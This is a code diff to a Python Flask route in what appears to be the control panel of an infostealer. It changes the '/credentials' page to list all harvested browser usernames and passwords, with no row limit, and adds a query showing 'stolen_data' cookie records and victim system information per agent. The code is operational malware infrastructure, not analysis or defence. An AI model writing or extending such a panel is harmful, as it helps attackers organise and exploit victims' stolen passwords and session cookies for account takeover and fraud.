@@ -163,21 +163,42 @@ def init_view_routes(app):
     @app.route('/credentials')
     @login_required
     def credentials():
-        browser = request.args.get('browser', 'all')
+        browser_filter = request.args.get('browser')
+        
+        # Query for regular credentials
         conn = sqlite3.connect(CONFIG.database)
         c = conn.cursor()
         
-        if browser == 'all':
-            c.execute("SELECT * FROM credentials ORDER BY timestamp DESC LIMIT 100")
+        if browser_filter:
+            c.execute("SELECT * FROM credentials WHERE browser=? ORDER BY timestamp DESC", (browser_filter,))
         else:
-            c.execute("SELECT * FROM credentials WHERE browser=? ORDER BY timestamp DESC LIMIT 100", 
-                     (browser,))
+            c.execute("SELECT * FROM credentials ORDER BY timestamp DESC")
         
-        creds = [dict(zip(['id', 'agent_id', 'browser', 'url', 'username', 'password', 'timestamp'], row)) 
-                 for row in c.fetchall()]
+        credentials = [dict(zip([col[0] for col in c.description], row)) for row in c.fetchall()]
+        
+        # Query for stolen cookies data
+        c.execute('''SELECT id, agent_id, browser, system_info, timestamp 
+                    FROM stolen_data 
+                    WHERE data_type='cookies'
+                    ORDER BY timestamp DESC''')
+        
+        cookies_data = []
+        for row in c.fetchall():
+            row_dict = dict(zip([col[0] for col in c.description], row))
+            try:
+                # Parse system_info if it's stored as JSON string
+                if row_dict['system_info']:
+                    row_dict['system_info'] = json.loads(row_dict['system_info'])
+            except:
+                row_dict['system_info'] = {}
+            cookies_data.append(row_dict)
         
         conn.close()
-        return render_template('credentials.html', credentials=creds)
+        
+        return render_template('credentials.html', 
+                            credentials=credentials,
+                            cookies_data=cookies_data,
+                            browser_filter=browser_filter)
 
     @app.route('/tasks')
     @login_required
